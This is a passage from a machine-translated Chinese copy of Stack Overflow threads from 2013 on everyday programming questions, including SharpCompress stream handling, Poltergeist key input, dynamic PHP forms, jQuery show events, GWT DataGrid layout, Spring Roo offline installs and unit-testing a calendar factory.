            using (var reader = RarReader.Open(GetStreams(extractionPackage)))//extractionPackage.ExtractionFiles.Select(p => File.OpenRead(p.FullPath)), Options.None))
            {
                while (reader.MoveToNextEntry())
                {
                    reader.WriteEntryToDirectory(fullExtractionPath, ExtractOptions.ExtractFullPath | ExtractOptions.Overwrite);
                }
            }

            return true;
        }
        catch (Exception)
        {
            return false;
        }
    }

    private static IEnumerable<Stream> GetStreams(ExtractionPackage package)
    {
        foreach (var item in package.ExtractionFiles)
        {
            using (Stream input = File.OpenRead(item.FullPath))
            {
                yield return input;
            }
        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T16:12:50.020

默认情况下（可能是一个缺陷）是我将 Streams 保持打开状态，因为我没有自己创建它们。但是，.NET 框架通常会用 StreamReader 等东西打破这个规则，所以预计它们会被关闭。

我想我要改变这种行为。同时，您应该能够通过调用以下方法自己解决此问题：

```
RarReader.Open(extractionPackage.ExtractionFiles.Select(p => File.OpenRead(p.FullPath)), Options.None) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-11-28T20:29:12.320

我也有类似的麻烦。我使用 SharpCompress 在存档中添加文件，我需要在存档后删除文件。我曾尝试使用 using() {} 包装流 - 但此解决方案不适用于我的情况。当我添加到我的代码 Application.DoEvents() - 它解决了这个问题。

# poltergeist - send_keys 支持 Poltergeist？

> ID：15232682
> 
> 赞同：17
> 
> 时间：2013-03-05T19:41:58.300
> 
> 标签：poltergeist

我想从 Selenium 切换到 Poltergeist，但我需要模拟一个条形码扫描仪，它看起来像`<body>`标签的键盘输入。我将此代码与 Selenium 一起使用：

```
native.send_keys(send_key) 
```

Poltergeist 有没有办法将一串键发送到任意元素（即，不是输入）？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2014-02-13T22:42:26.630

Poltergeist 现在[有 send_keys 支持](https://github.com/jonleighton/poltergeist#sending-keys)：

```
element = find('input#id')

# send a simple string
element.native.send_key('String')

# send a series of keystrokes
element.native.send_keys('H', 'elo', :Left, 'l') # => 'Hello'

# symbol for special keys
element.native.send_key(:Enter) # triggers Enter key 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-06-11T13:26:08.047

从 PhantomJS 1.7（2012-09-22 发布）开始，您可以使用[`page.sendEvent`](http://phantomjs.org/api/webpage/method/send-event.html).

该文档包括一个模拟 shift-A 的示例：

```
page.sendEvent('keypress', page.event.key.A, 
               null, null, 0x02000000 | 0x08000000 ); 
```

页面如何准确地处理输入（即目标）将取决于页面的状态，例如焦点所在的位置。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-05T22:26:43.930

不，目前没有办法做到这一点。PhantomJS 确实为此提供了一个 API，因此将来可能会添加它，但目前不支持。

我建议尝试在 Javascript 中生成 DOM 键盘事件。或者只是使用 Selenium 保留这些规格，其余的使用 Poltergeist。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-12-24T06:14:48.627

从 1.5.0 版本开始，poltergeist 支持基本的 send_keys。

[https://github.com/jonleighton/poltergeist/blob/master/CHANGELOG.md#150](https://github.com/jonleighton/poltergeist/blob/master/CHANGELOG.md#150)

# php - 发布表单值，其中字段名称是从循环动态创建的？

> ID：15232686
> 
> 赞同：0
> 
> 时间：2013-03-05T19:42:17.863
> 
> 标签：php, mysql, loops, post, foreach

我有一个页面是根据用户在前一页上提交的信息动态创建的。例如，在第 1 页上，用户输入了一些部门名称。他们想输入多少就输入多少。在第 2 页，为在第一页输入的每个部门创建了多个部分。在这些部分中的每一个都将是表单，我目前已将其设置为使用变量 $a 创建表单的名称。单击每个部分中的提交按钮后，我需要知道如何发布这些项目。我尝试了几种不同的方法，但没有任何效果。我希望它只发布与提交按钮的 $a 具有相同 $a 值的项目。

```
 $departmentSql = "SELECT * FROM b_departments WHERE loc_id='$locid' AND b_id =     '$bid'";
    $departmentResults = mysql_query($departmentSql,$con);

$a = 0;

while ($departmentRow = mysql_fetch_array($departmentResults)) {

$department = $departmentRow['b_dep_name'];
$departmentID = $departmentRow['dep_id'];
$b_departmentID = $departmentRow['b_dep_id'];
$a++;

echo "

<div id=depDiv>
<div id=depDivHeader>
".$department."
</div>
";

$areaSql = "SELECT * from areas WHERE dep_id = $departmentID ORDER BY area_name ASC";
$areaSqlResult = mysql_query($areaSql);
?>

<br />
<input type="hidden" name="bdep<?php echo $a;?>" value="<?php echo $b_departmentID; ?>" />
Add Area: 
<select name="dep_area<?php echo $a;?>" type="menu">
    <option value=""></option>
    <?php while($areaRows=mysql_fetch_assoc($areaSqlResult)){?>
    <option value="<?php echo "".$areaRows['area_id'].",".$areaRows['area_name']."" ?>"><?    php echo $areaRows[       'area_name'] ?></option>
<?php }
?>
</select>
&nbsp;&nbsp;
<input type="submit" name="areaSub<?php echo $a;?>" value="Add" />

<?php
echo "</div>"; 
}
?> 
```

****编辑我需要所有内容都采用一种形式，因为页面的重点是将稍后插入每个单独部分的所有值相加。****

*** *编辑2：

我使用@dirt 的 jquery 建议解决了这个问题。

HTML：

```
$departmentSql = "SELECT * FROM b_departments WHERE loc_id='$locid' AND b_id = '$bid'";
$departmentResults = mysql_query($departmentSql,$con);

$a = 0;

while ($departmentRow = mysql_fetch_array($departmentResults)) {

$department = $departmentRow['b_dep_name'];
$departmentID = $departmentRow['dep_id'];
$b_departmentID = $departmentRow['b_dep_id'];
$a++;

echo "

<div id=depDiv>
<div id=depDivHeader>
".$department."
</div>
<div id=$a>
";

$areaSql = "SELECT * from areas WHERE dep_id = $departmentID ORDER BY area_name ASC";
$areaSqlResult = mysql_query($areaSql);
?>

<br />
<input type="hidden" name="bdep<?php echo $a ?>" value="<?php echo $b_departmentID; ?>" />
Add Area: 
<select name="dep_area<?php echo $a ?>" type="menu">
    <option value=""></option>
    <?php while($areaRows=mysql_fetch_assoc($areaSqlResult)){?>
    <option value="<?php echo "".$areaRows['area_id'].",".$areaRows['area_name']."" ?>"><?    php echo $areaRows[       'area_name'] ?></option>
<?php }
?>
</select>
&nbsp;&nbsp;
<button type="submit" name="areaSub" value="<?php echo $a ?>" />Add</button>

<?php
echo "</div></div>"; 
} ?> 
```

jQuery：

```
<script>
$(document).ready(function() {
    $('#<?php echo $a ?>').submit(function() {
        .post("include/action.php")
    }); 
});
</script> 
```

PHP：

```
if(isset($_POST['areaSub'])) {

$areaval = intval($_POST['areaSub']);   

$area = mysql_real_escape_string($_POST["dep_area".$areaval.""]);
list($area_id, $area_name) = explode(',', $area, 2);
$bdep = mysql_real_escape_string($_POST["bdep".$areaval.""]); 

echo $areaval;
echo $area_name;
echo $bdep;

} 
```

* * *

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:05:18.017

**编辑：**如果它是一个包含多个部分的表单，并且您不想在 POST 之后修剪掉不需要的表单数据，那么我认为您必须在发布到服务器之前使用 jQuery 来修剪表单值，所以请参阅我的 jQuery 部分下面是一个简单的示例，说明您将如何仅发布所选按钮的数据。

简短的回答是使用**提交按钮的****名称/值**属性并在发布后对其进行评估。具有相同名称的多个按钮可以具有不同的值，并且值不必是标签。

 **例子：

```
<form id='<?php echo $a; ?>'>
    <input type='text' name='in1'>
    <input type='text' name='in2'>
    <button type='submit' name='submit' value='<?php echo $a; ?>'>Add</button>
</form>
...
<form id='<?php echo $a; ?>'>
    <input type='text' name='in1'>
    <input type='text' name='in2'>
    <button type='submit' name='submit' value='<?php echo $a; ?>'>Add</button>
</form>
...
<?php
    # _POST:
    if (isset($_POST['submit']) && $_POST['submit'] == '1') {
        echo 'Department 1';
    }
    if (isset($_POST['submit']) && $_POST['submit'] == '2') {
        echo 'Department 2';
    }
?> 
```

您还可以使用 jQuery 获取包含在某个 Div ID 中的所有元素。类似的东西（这是一个粗略的想法）：

```
<div id='<?php echo $a; ?>'>

    <input type='text' name='in1'>
    <input type='text' name='in2'>

    <input type="submit" name="areaSub<?php echo $a;?>" value="Add" />
</div> 
```

jQuery：

```
$('#<?php echo $a; ?>').submit(function() {
    do_something_with_form_$a
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:56:51.247

我不确定我是否完全理解......但你遇到的问题是，当用户点击一组给定值（给定部门）的“提交”按钮时，它会提交所有数据这页纸？您只希望提交该特定区域的输入字段？

用标签分割表格：

```
 <form> </form> 
```

因此，您将拥有多个区域：

```
 while(...) {
    <form method="..." name="form $a">
       <input name="... $a">
       <input name="... $a">
        ...
       <submit>
   </form>
} 
```

（显然这是伪代码，相应调整）**

# jquery - jQuery：元素显示时如何调用函数

> ID：15232688
> 
> 赞同：5
> 
> 时间：2013-03-05T19:42:23.707
> 
> 标签：jquery, bind, show

我想在 div 显示时（显示后）调用一个函数。

有谁知道我该怎么做？我尝试使用类似的东西：

```
$(#someDiv).bind('show',function(){
    alert('example')
}); 
```

但我不确定我是否以正确的方式做到这一点，或者是否有可能实现这一目标。有任何想法吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-10-22T18:41:01.277

以下代码（改编自[http://maximeparmentier.com/2012/11/06/bind-show-hide-events-with-jquery/](http://maximeparmentier.com/2012/11/06/bind-show-hide-events-with-jquery/)）将使您能够使用`$('#someDiv').on('show', someFunc);`.

```
(function ($) {
  $.each(['show', 'hide'], function (i, ev) {
    var el = $.fn[ev];
    $.fn[ev] = function () {
      this.trigger(ev);
      el.apply(this, arguments);
      return el;
    };
  });
})(jQuery); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-05T19:44:54.313

它必须在 show() 方法的后回调中完成：

```
$('#someDiv').show('slide',function(){
    alert('example')
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-11-20T10:03:04.423

```
<script type="text/javascript" src="jquery-1.8.0.min.js"></script>

    <script>

    $(document).ready(function(){
$("#jq_message").show(function(){
$("#jq_message").fadeOut(3000);

$("#div2").fadeOut("slow");

$("#div3").fadeOut(3000);

    }); 

    });

    </script>
<div id="jq_message">
</div> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-05T19:44:08.043

```
$('#element').live('show', function(){
    // CODE
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-03-09T23:10:51.100

我用这个

```
$(document).on("pagebeforeshow", "#elementID", function ()
{
    //Whatever
}); 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2013-06-18T16:05:43.710

[jQuery 直播](http://api.jquery.com/live/)

从 jQuery 1.7 开始，**不推荐使用 .live() 方法**。使用 .on() 附加事件处理程序。旧版本 jQuery 的用户应该使用 .delegate() 而不是 .live()。

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2013-03-05T19:43:40.093

尝试这个

```
$(#someDiv).bind('show',function(){
    callFunction();
}); 
```

或者

```
$(#someDiv).on('show',function(){
    callFunction();
}); 
```

函数调用函数（） { ...... }

# wordpress - Wordpress get_page“阅读更多”标签

> ID：15232689
> 
> 赞同：1
> 
> 时间：2013-03-05T19:42:32.803
> 
> 标签：wordpress

所以我想在这里使用阅读更多标签：http: [//codex.wordpress.org/Customizing_the_Read_More](http://codex.wordpress.org/Customizing_the_Read_More)

但我正在使用 get_page 函数：

```
$page_id = 1;
$include = get_page($page_id);
$content = apply_filters('the_content',$include->post_content); 
```

当我通过 WYSIWYG 页面插入更多标签时，当我回显 $content 时它会被忽略。

我想我需要在 apply_filters 中添加一些东西，但我不确定是什么

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:59:00.930

您需要更改`post_content`为`post_excerpt`以呼应所见即所得的摘录

```
 $page_id = 1;
        $include = get_page($page_id);
        $content =  apply_filters('the_content',$include->post_excerpt); 
        echo $content; 
```

# gwt - GWT DataGrid setEmptyTableWidget，当显示的列多于当前窗口时，没有结果，也没有水平滑动条

> ID：15232694
> 
> 赞同：1
> 
> 时间：2013-03-05T19:42:52.993
> 
> 标签：gwt, datagrid, multiple-columns

![样本布局](../Images/f72877b3cb4143f77ccb085651912a33.png)

我在我的`DataGrid`一个布局中使用 a 。我已经成功地指定了一些静态文本在没有结果时使用`setEmptyTableWidget(Widget)`. 通常，我通过类似`new HTML("No results")`.

但是...当我的列数超出了我在视口中的容量（即浏览器窗口的当前显示宽度）时，我看不到所有列标题，也无法滚动到（向右）查看它们。

我有一个布局，当有数据时支持滚动！但是没有数据时水平滚动条不会出现。我无法摆脱这个问题。

欢迎任何提示或建议。

这是我的布局...（您将在下面看到我`setEmptyTableWidget`在 `PagingDataTableDatGrid#initGrid(DataGridConfiguration)`'s 方法实现中调用的位置）。

```
<!DOCTYPE ui:UiBinder SYSTEM "http://dl.google.com/gwt/DTD/xhtml.ent">
<ui:UiBinder xmlns:ui="urn:ui:com.google.gwt.uibinder"
         xmlns:gwt="urn:import:com.google.gwt.user.client.ui"
         xmlns:com="urn:import:org.spp.im.mui.gwt.client.module.common.widget.grid">

<ui:with field="res" type="org.spp.im.mui.gwt.client.resources.UiResources" />
<ui:with field="msg" type="org.spp.im.mui.gwt.shared.i18n.UiMessages" />

<!-- Layout -->
<gwt:DockLayoutPanel width="100%" height="100%" styleName="{res.style.container}" unit="PX">
    <gwt:north size="25">
        <gwt:HorizontalPanel width="100%">
            <!-- Buttons -->
            <gwt:cell horizontalAlignment="ALIGN_RIGHT">
                <com:GridButtonBar ui:field="bar" />
            </gwt:cell>
        </gwt:HorizontalPanel>
    </gwt:north>
    <gwt:center>
        <!-- Grid -->
        <com:ReadOnlyGrid ui:field="grid" width="100%" />
    </gwt:center>
    <gwt:south size="25">
        <gwt:HorizontalPanel width="100%">
            <!-- Pagination controls -->
            <gwt:cell horizontalAlignment="ALIGN_LEFT">
                    <com:CustomPager ui:field="pager" width="225px" />
            </gwt:cell>
        </gwt:HorizontalPanel>
    </gwt:south>
</gwt:DockLayoutPanel>

</ui:UiBinder> 
```

`ReadOnlyGrid`是自定义实现...

```
public class ReadOnlyGrid extends PagingDataTableDataGrid<DataRow> {

private Set<Column<DataRow, ?>> columns = new HashSet<Column<DataRow, ?>>();

// preferred constructor in most cases
public ReadOnlyGrid() {
    super();
}

public ReadOnlyGrid(final DataGridConfiguration config) {
    super(config);
}

@Override
protected Set<Column<DataRow, ?>> allColumns() {
    return columns;
}

@Override
// first column always has default ascending sort order
public void initTableColumns(final DataGrid<DataRow> dataGrid, final DataTable table,
        final ListHandler<DataRow> sortHandler) {
    Column<DataRow, String> column;

    final int totalColumns = table.getColumnCount();
    String columnName = null;
    ColumnHints columnHints = null;
    for (int col = 0; col < totalColumns; col++) {
        final int c = col;
        columnName = table.getColumnName(c);
        columnHints = table.getColumnHints(columnName);
        if (columnHints.isVisible()) {
            column = new Column<DataRow, String>(new DataTableCell()) {

                @Override
                public String getValue(final DataRow row) {
                    String result = "";
                    if (row != null) {
                        result = row.get(c);
                    }
                    return result;
                }

            };
            column.setSortable(true);
            sortHandler.setComparator(column, new Comparator<DataRow>() {
                @Override
                public int compare(final DataRow r1, final DataRow r2) {
                    final String one = r1.get(c);
                    final String two = r2.get(c);

                    if (one == null ^ two == null) {
                        return one == null ? -1 : 1;
                    }

                    if (one == null && two == null) {
                        return 0;
                    }

                    return one.compareToIgnoreCase(two);
                }
            });
            final String header = columnHints.getColumnHeader() == null ? columnName : columnHints.getColumnHeader();
            // create the column header
            // header should have the same alignment as the column data
            dataGrid.addColumn(column, createHeader(header, columnHints.getColumnAlignment()));
            // keep track of columns added
            allColumns().add(column);

            // Set the column width
            dataGrid.setColumnWidth(column, columnHints.getColumnWidth(), Unit.PX);

            // Set the column alignment
            if (columnHints.getColumnAlignment() != null) {
                column.setHorizontalAlignment(columnHints.getColumnAlignment());
            }
            else {
                column.setHorizontalAlignment(HasHorizontalAlignment.ALIGN_RIGHT);//default
            }

            if (c == 0) {
                dataGrid.getColumnSortList().push(column);
            }
        }

    }

}

@Override
protected void initTableRows(final DataTable table) {
    setDataList(table.allRows());
}

private SafeHtml createHeader(final String columnHeaderHtml, HasHorizontalAlignment.HorizontalAlignmentConstant columnHeaderAlignment) {
    columnHeaderAlignment = columnHeaderAlignment == null ? HasHorizontalAlignment.ALIGN_RIGHT : columnHeaderAlignment;
    final String ch = replaceCrWithBr(columnHeaderHtml);
    final SafeHtmlBuilder sb = new SafeHtmlBuilder();
    sb.appendHtmlConstant("<div align=\"" + columnHeaderAlignment.getTextAlignString() + "\">")
    .appendHtmlConstant(ch).appendHtmlConstant("</div>");
    final SafeHtml header = sb.toSafeHtml();
    return header;
}

private String replaceCrWithBr(final String value) {
    String result = value;
    if (value.contains(App.INSTANCE.carriage_return())) {
        result = value.replace(App.INSTANCE.carriage_return(), App.INSTANCE.separator());
    }
    return result;
}

} 
```

并且`PagingDataTableDataGrid`...

```
public abstract class PagingDataTableDataGrid<T extends DataRow> extends Composite {

private DataGrid<T> dataGrid;
private ListDataProvider<T> dataProvider;
private ResizeLayoutPanel wrapper;

// default, use in UiBinder template when you just want to @UiField inject a subclass
public PagingDataTableDataGrid() {
    this(new DefaultDataGridConfiguration());
}

// alternate, use in UiBinder template when you want to create an instance
// yourself, user to inject w/ @UiField(provided=true)
public PagingDataTableDataGrid(final DataGridConfiguration config) {
    wrapper = new ResizeLayoutPanel();
    wrapper.setWidth("100%");
    wrapper.setStyleName(UiResources.INSTANCE.style().gridWrapper());
    initWidget(wrapper);
    initGrid(config);
}

private void initGrid(final DataGridConfiguration config) {
    dataGrid = new DataGrid<T>(config.getPageSize(), config.getResources());
    final HTML noResults = new HTML(UiMessages.INSTANCE.no_results());
    dataGrid.setEmptyTableWidget(noResults);
    wrapper.clear();
    wrapper.add(dataGrid);
}

public void setInput(final DataTable table) {
    resetTableColumns();
    dataProvider = new ListDataProvider<T>();
    dataProvider.setList(new ArrayList<T>());
    final ListHandler<T> sortHandler = new ListHandler<T>(dataProvider.getList());
    dataGrid.addColumnSortHandler(sortHandler);
    initTableColumns(dataGrid, table, sortHandler);
    initTableRows(table);
    dataProvider.addDataDisplay(dataGrid);

    // trigger sort client-side
    ColumnSortEvent.fire(dataGrid, dataGrid.getColumnSortList());

    GridUtil.setStyles(this.dataGrid);
}

protected abstract Set<Column<T, ?>> allColumns();

// see
// http://stackoverflow.com/questions/3772480/remove-all-columns-from-a-celltable
// concrete classes are forced to maintain a handle on all columns added
private void resetTableColumns() {
    for (final Column<T, ?> column : allColumns()) {
        dataGrid.removeColumn(column);
    }
    allColumns().clear();
}

/**
 * Add columns to this grid
 * 
 * @param dataGrid
 *            a GWT DataGrid implementation
 * @param table
 *            the model data
 * @param sortHandler
 *            a GWT ListHandler implementation
 */
protected abstract void initTableColumns(DataGrid<T> dataGrid, DataTable table, ListHandler<T> sortHandler);

/**
 * Add rows to this grid
 * @param table the model data
 */
protected abstract void initTableRows(DataTable table);

protected void setDataList(final List<T> dataList) {
    final List<T> list = dataProvider.getList();
    list.addAll(dataList);
    dataProvider.refresh();
}

public DataGrid<T> getDataGrid() {
    return dataGrid;
}

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-11T00:37:28.180

所以，作为一个“黑客”，我设法通过使用一个非常大的像素值来获得我想要的行为`Widget`。

例如，

```
Label noResults = new Label("No results");
noResults.setWidth("20000px"); 
```

这具有将标签文本一直推到左侧的效果，而不是在列标题下方居中。但我可以活下去，b/c 然后列标题是可滚动的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T04:54:32.977

您的代码没有任何问题。它是由 gwt 设计的。没有数据为什么要出现滚动条。即使我在使用数据网格时也有类似的疑问，但严重的是，在没有数据时提供滚动是没有意义的。

# installation - 如何在离线时安装 Spring Roo 附加组件

> ID：15232696
> 
> 赞同：0
> 
> 时间：2013-03-05T19:43:02.800
> 
> 标签：installation, spring-roo, offline, add-on

在工作中，我们的开发环境是一个没有连接到互联网的内部网络。我目前正在尝试使用 Spring Roo 的数据库逆向工程功能，但似乎无法让附加组件 org.springframework.roo.wrapping.mysql-connector-java 离线正确安装。我尝试了以下方法：

1.  按照此链接[jtds 驱动程序插件问题](http://forum.springsource.org/archive/index.php/t-112165.html?s=1d092f47977feda63ab2905ecb0c575e)

    *   我使用 roobot.xml 找到 wrapping.mysql-connector-java 的 url 并下载了 jar。
    *   根据 Roo docs [Roo Docs Packaging & Distribution](http://static.springsource.org/spring-roo/reference/html-single/index.html#simple-addons-packaging)我使用以下命令加载 osgi jar。
        `roo> osgi start --url file:///<path-to-addon-project/target/<addon-bundle-name>.<version>.jar`
    *   但这导致了以下错误：
        `org.osgi.framework.BundleException: Unresolved constraint in bundle org.springframework.roo.wrapping.mysql-connector-java[75]: Unable to resolve 75.0: missing requirement [75.0] package; (package=org.slf4j)`

2.  我们有一个带有 slf4j jar 的内部仓库，但我不知道如何配置 Roo 以指向它。

3.  我使用请求的 mysql 插件复制了我在家用计算机上进行的安装的 ROO_HOME，但是当我尝试在我的工作环境中运行它时，我得到了多个： `Auto-deploy install: org.osgi.framework.BundleException: Bundle symbolic name and version are not unique:...`

任何帮助将不胜感激，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-24T17:27:57.763

我建议在您的开发网络上创建一个 Maven 存储库管理器，并使用您的所有依赖项为其播种。没有它，我无法离线使用 Spring/Roo，因为我一直遇到你遇到的那种麻烦。我使用[了 Sonatype Nexus OSS](http://www.sonatype.org/nexus/)。播种存储库很痛苦，但它使 Roo 可以离线使用。希望有帮助。

# unit-testing - 对由大量逻辑创建的自定义集合进行单元测试

> ID：15232697
> 
> 赞同：0
> 
> 时间：2013-03-05T19:43:03.530
> 
> 标签：unit-testing

我有一个带有 Create 方法的 Factory 类，它需要 8 个参数。

所有这 8 个参数都在 Create 方法中组合使用。

Create 方法返回一个自定义集合。

作为结果的自定义集合需要以某种方式与其他集合进行比较，我

也传递给了 Create 方法。但我无法对自定义进行 1:1 的比较

收藏。我将不得不过滤、向下钻取、排序等......事情才能成功

断言...

我对单元测试很了解，但我对测试这样的场景一无所知，而没有将太多逻辑带入我真正想要避免的断言本身。

由于 Create 方法返回日历的“天”集合，因此我无法对单日进行手动测试，我必须测试整个集合。边缘案例测试是不够的。

**更新**

我在这里放了一个样本，这是我的样本中最容易理解的样本......

我的其他单元测试（未完成）将更难，因为我的日期范围更大，这意味着很多

断言和测试逻辑增加。

```
[Test]
        public void CreatePeriods_3TimeTablesWithin7VisibleDays_21Periods()
        {
            // ARRANGE
            IDateService dateService = new DateService();
            LessonplannerFactory factory = new LessonplannerFactory(dateService);

            DateTime startDate = new DateTime(2013, 03, 01);
            DateTime endDate = new DateTime(2013, 03, 15);

            String schoolclassCode1 = "BIO1";
            String schoolclassCode2 = "BIO2";
            String schoolclassCode3 = "BIO3";

            IEnumerable<TimeTable> timetableA = new List<TimeTable> { 
                new TimeTable { LessonNumber = 3, SchoolclassCodeMonday = schoolclassCode3, WeekTypeState = TimeTable.WeekType.A },
                new TimeTable { LessonNumber = 2, SchoolclassCodeMonday = schoolclassCode2, WeekTypeState = TimeTable.WeekType.A }, 
                new TimeTable { LessonNumber = 1, SchoolclassCodeMonday = schoolclassCode1, WeekTypeState = TimeTable.WeekType.A }, 
            };

            TimeTable.WeekType selectedWeekType = TimeTable.WeekType.A;
            TimeTable.WeekType startWeekType = TimeTable.WeekType.A;
            DayOfWeek firstDayOfWeek = DayOfWeek.Monday;
            IEnumerable<DayOfWeek> visibleWeekDays = new List<DayOfWeek> { DayOfWeek.Friday, DayOfWeek.Sunday, DayOfWeek.Monday };

            int numberOfVisibleDays = 7; int numberOfTimeTables = 3;

            // ACT
            var periods = factory.Create(startDate, endDate, 0, timetableA, null, selectedWeekType, startWeekType, firstDayOfWeek, visibleWeekDays);

            // sort by both properties to make this unit test testable...
            var sortedPeriods = periods.OrderBy(p => p.LessonNumber).ThenBy(p => p.LessonDate);

            // ASSERT

            Assert.IsTrue(periods.Count() == numberOfTimeTables * numberOfVisibleDays);

            // LessonNumber 1
            Assert.AreEqual(sortedPeriods.ElementAt(0).LessonNumber, 1);
            Assert.AreEqual(sortedPeriods.ElementAt(1).LessonNumber, 1);
            Assert.AreEqual(sortedPeriods.ElementAt(2).LessonNumber, 1);
            Assert.AreEqual(sortedPeriods.ElementAt(3).LessonNumber, 1);
            Assert.AreEqual(sortedPeriods.ElementAt(4).LessonNumber, 1);
            Assert.AreEqual(sortedPeriods.ElementAt(5).LessonNumber, 1);
            Assert.AreEqual(sortedPeriods.ElementAt(6).LessonNumber, 1);

            Assert.AreEqual(sortedPeriods.ElementAt(0).SchoolclassCode, string.Empty);
            Assert.AreEqual(sortedPeriods.ElementAt(1).SchoolclassCode, string.Empty);
            Assert.AreEqual(sortedPeriods.ElementAt(2).SchoolclassCode, schoolclassCode1);
            Assert.AreEqual(sortedPeriods.ElementAt(3).SchoolclassCode, string.Empty);
            Assert.AreEqual(sortedPeriods.ElementAt(4).SchoolclassCode, string.Empty);
            Assert.AreEqual(sortedPeriods.ElementAt(5).SchoolclassCode, schoolclassCode1);
            Assert.AreEqual(sortedPeriods.ElementAt(6).SchoolclassCode, string.Empty);

            Assert.AreEqual(sortedPeriods.ElementAt(0).LessonDate, new DateTime(2013, 03, 01));
            Assert.AreEqual(sortedPeriods.ElementAt(1).LessonDate, new DateTime(2013, 03, 03));
            Assert.AreEqual(sortedPeriods.ElementAt(2).LessonDate, new DateTime(2013, 03, 04));
            Assert.AreEqual(sortedPeriods.ElementAt(3).LessonDate, new DateTime(2013, 03, 08));
            Assert.AreEqual(sortedPeriods.ElementAt(4).LessonDate, new DateTime(2013, 03, 10));
            Assert.AreEqual(sortedPeriods.ElementAt(5).LessonDate, new DateTime(2013, 03, 11));
            Assert.AreEqual(sortedPeriods.ElementAt(6).LessonDate, new DateTime(2013, 03, 15));

            // LessonNumber 2
            // do the same as above

            // LessonNumber 3  
            // do the same as above
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:48:40.683

在我看来，您需要将“创建”的代码分解成更小的部分。函数中有这么多参数通常表明将太多功能混合到一个对象中。

如果您可以将工作分成更小的对象，则可以更轻松地测试每个对象的功能，然后可以使用更高级别的测试来确保您正确地将工作委派给所有更小的对象。

# css - 用于选择包含 img 的表格单元格的 css 选择器

> ID：15232698
> 
> 赞同：4
> 
> 时间：2013-03-05T19:43:04.460
> 
> 标签：css, selector

我想将其中有一个 img 的表格单元格的字体颜色设为红色。我将如何使用 css 选择器来专门做到这一点？该问题可以扩展到如何选择具有特定类型元素作为其子元素的元素。谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:48:53.503

您是否提前知道哪些单元格中会有图像？如果是这样，则向 td 元素添加一个类，例如：

```
<tr>
   <td class="has-image"><img src="..." /></td>
</tr> 
```

这是最简单的方法...否则您需要使用 JavaScript。在 jquery 中，这看起来像：

```
$('td img').parents('td').addClass('has-image'); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-05T19:47:12.327

[在 CSS4 中有一个规范](http://www.w3.org/TR/selectors4/#subject)，用于在更大的选择器中标记您要设置样式的元素。实际符号有所不同，目前指向`!`。

因此，在您的情况下，选择器将如下所示（根据当前规范）：

```
table !td img {
  font-color: red;
} 
```

但是请注意，当前的任何浏览器都不支持此功能。

# facebook - 是否可以将 Facebook 对话与非 Facebook 身份集成？

> ID：15232700
> 
> 赞同：0
> 
> 时间：2013-03-05T19:43:17.417
> 
> 标签：facebook, facebook-comments

我有一组用户永远不会在我的网站上使用 Facebook。再说一次，我有坚持它的用户。

我需要在我的网站上有一个论坛（如 Facebook 对话），以便用户可以与之互动。我知道我可以自制这个，但想要原生 FB 集成。

是否可以将 FB Conversations 与非 FB 集成帐户（任何其他身份验证系统）一起使用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T00:08:17.923

您还可以通过 Yahoo、AOL 和 Hotmail 允许第三方经过身份验证的用户。[Facebook 社交插件文档站点上](https://developers.facebook.com/docs/reference/plugins/comments/)列出了说明：

> **如何使用户能够使用其他登录提供程序发表评论？**
> 
> 在插件的设置部分，您可以选择在您的评论框中启用第三方登录。目前，这将使用户能够使用 Yahoo!、AOL 或 Hotmail 帐户发表评论。

# jquery - 在 Matlab 中使用 jQuery

> ID：15232703
> 
> 赞同：1
> 
> 时间：2013-03-05T19:43:23.993
> 
> 标签：jquery, api, matlab

我打算使用这个[API](http://www3.septa.org/hackathon/)来获取使用 Matlab 的火车时刻表，但 API 使用 jQuery。有没有人有办法在 Matlab 中使用这个 jQuery API？我找到了[THIS](http://www.mathworks.com/matlabcentral/fileexchange/33381-jsonlab-a-toolbox-to-encodedecode-json-files-in-matlaboctave)，但我不知道如何将我的 Matlab 变量附加到 jQuery 代码。任何帮助、想法、建议将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:59:02.330

API文档仅以jQuery为例，可以使用matlab的urlread

用户 urlread [http://www.mathworks.co.uk/help/matlab/ref/urlread.html](http://www.mathworks.co.uk/help/matlab/ref/urlread.html) 然后 json parser [http://www.mathworks.co.uk/matlabcentral/fileexchange/20565](http://www.mathworks.co.uk/matlabcentral/fileexchange/20565)或者你给的那个

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:48:38.223

这会有帮助吗？[MATLAB、jQuery 和 JSON](http://www.mathworks.com/matlabcentral/linkexchange/links/2377-matlab-jquery-and-json)

# maven - 可能使 Maven POM 元素不可继承？

> ID：15232707
> 
> 赞同：0
> 
> 时间：2013-03-05T19:43:37.010
> 
> 标签：maven, pom.xml, parent-pom

我有一个父 pom，它定义了许多我希望我的子 pom 继承的插件和依赖项。但是，我们使用 scm 元素作为发布版本的一部分，我想将父级的 scm 添加到 pom 中，但它不会被任何子级 pom 继承（以防子级忘记定义它并使用父级的）。有没有办法将元素设置为不可继承？

* * *

## 回答 #1

